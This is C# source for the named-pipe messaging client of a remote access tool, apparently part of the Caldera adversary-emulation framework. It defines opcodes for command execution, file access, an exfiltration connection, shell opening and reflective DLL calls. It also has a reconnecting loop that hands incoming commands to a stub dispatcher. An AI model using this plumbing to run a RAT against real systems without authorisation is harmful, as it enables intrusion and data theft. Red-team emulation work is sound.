using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.Diagnostics;
using System.Threading;
using System.Web.Script.Serialization;
using Microsoft.Win32.SafeHandles;
using static WinAPI.Kernel32;


namespace CalderaIO
{
    public static class Opcodes
    {
        // could do this with opcodes, but easier to debug and comply with the server with string values
        public const string Initiate = "initiate";
        public const string Exit = "exit";
        public const string ExecuteCommand = "execute";
        public const string WriteFile = "write_file";
        public const string ReadFile = "read_file";
        public const string ExfilConnection = "exfil_connection";
        public const string OpenShell = "open_shell";
        public const string ReflectiveDllFunction = "call_reflective_dll";
        public const string DllFunction = "call_dll";
    }

    public struct RatMessage
    {
        public string opcode;
        public bool response;
        public int id;
        public Dictionary<string, string> parameters;
    }
    
    public class IOClient
    {
        internal static string pipeName = "caldera";
        internal PipeStream pipeStream;
        internal StreamReader pipeReader;
        internal StreamWriter pipeWriter;

        public virtual RatMessage DispatchMessage(RatMessage message)
        {
            return new RatMessage();
        }

        private void WriteMessage(RatMessage message)
        {
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            WriteLine(serializer.Serialize(message));
        }

        private RatMessage DecodeLine(string line)
        {
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            RatMessage message = serializer.Deserialize<RatMessage>(line);
            return message;
        }

        private void WriteLine(string line)
        {
            
            Debug.WriteLine("Outgoing Message:" + line);
            String b64Line = Convert.ToBase64String(Encoding.UTF8.GetBytes(line));
            pipeWriter.WriteLine(b64Line);
        }

        private bool Connect()
        {
            uint FILE_GENERIC_READ = 1179785;
            uint FILE_WRITE_DATA = 2;

            IntPtr pHandle = CreateFileW("\\\\.\\pipe\\" + pipeName, FILE_GENERIC_READ | FILE_WRITE_DATA, 0, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
            if (pHandle == new IntPtr(-1))
            {
                return false;
            }
            SafePipeHandle sphandle = new SafePipeHandle(pHandle, true);
            pipeStream = new NamedPipeClientStream(PipeDirection.InOut, false, true, sphandle);
            // TODO: confirm that the server is running with greater permissions

            pipeReader = new StreamReader(pipeStream);
            pipeWriter = new StreamWriter(pipeStream);
            pipeWriter.AutoFlush = true;
            return true;
        }

  
        private string ReadLine()
        {
            string b64Line = String.Empty;
            while (b64Line == String.Empty || b64Line == null) {
                b64Line = pipeReader.ReadLine();
                if (! pipeStream.IsConnected)
                {
                    return String.Empty;
                }
            }
            b64Line = b64Line.Trim();
            Debug.WriteLine("Incoming Message b64:" + b64Line);
            string nextLine = Encoding.UTF8.GetString(Convert.FromBase64String(b64Line));
            Debug.WriteLine("Incoming Message:" + nextLine);
            return nextLine;
        }


        public void RunForever()
        {
            string state = "connecting";
            while (true)
            {
                switch (state)
                {
                    case "disconnected":
                        DisconnectStreams();
                        Debug.WriteLine("Lost connection... Reconnecting...");
                        state = "connecting";
                        break;
                    case "connecting":
                        if (Connect())
                        {
                            state = "handshake";
                        } else
                        {
                            Thread.Sleep(1000);
                        }
                        break;
                    case "handshake":
                        {
                            string line = ReadLine();
                            if (line == string.Empty)
                            {
                                state = "disconnected";
                                break;
                            }
                            RatMessage message = DecodeLine(line);
                            Debug.Assert(message.opcode == Opcodes.Initiate, "unexpected opcode during handshake!");
                            // flip this bit
                            message.response = true;
                            WriteMessage(message);
                            state = "connected";
                            break;
                        }
                    case "connected":
                        {
                            Debug.WriteLine("Waiting for message...");
                            string line = ReadLine();
                            if (line == string.Empty)
                            {
                                state = "disconnected";
                                break;
                            }
                            RatMessage message = DecodeLine(line);
                            if (message.opcode == Opcodes.Exit)
                            {
                                state = "exit";
                                break;
                            }

                            RatMessage returnMessage = DispatchMessage(message);
                            WriteMessage(returnMessage);
                            break;
                        }
                    case "exit":
                        DisconnectStreams();
                        return;
                    default:
                        return;
                }
            }
        }

        private bool DisconnectStreams()
        {
            // assume that pipeStream has already been created and connected (for server)
            if (pipeStream.IsConnected)
            {
                if (pipeReader != null)
                {
                    pipeReader.Close();
                }

                if (pipeWriter != null)
                {
                    pipeWriter.Close();
                }

                pipeStream.Close();
            } else
            {
                pipeReader = null;
                pipeWriter = null;
                pipeStream = null;
            }
            return true;
        }
    }
}
